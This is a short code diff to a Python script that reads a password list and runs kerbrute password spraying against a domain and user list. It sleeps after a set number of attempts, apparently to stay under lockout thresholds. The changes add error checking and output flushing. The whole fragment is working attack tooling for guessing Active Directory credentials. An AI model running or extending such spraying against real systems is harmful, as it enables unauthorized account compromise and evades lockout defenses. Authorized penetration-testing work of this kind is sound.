@@ -25,9 +25,10 @@ i = 0
 
 with open (p) as passwords:
      while (password := passwords.readline().rstrip()):
-        subprocess.run(["kerbrute", "passwordspray" , "-d", d, u , password])
+        subprocess.run(["kerbrute", "passwordspray" , "-d", d, u , password], check=True)
         i += 1
         if i == a:
             i = 0
             print("sleeping for", s,  "minute(s)")
+            sys.stdout.flush()
             time.sleep(minutes)
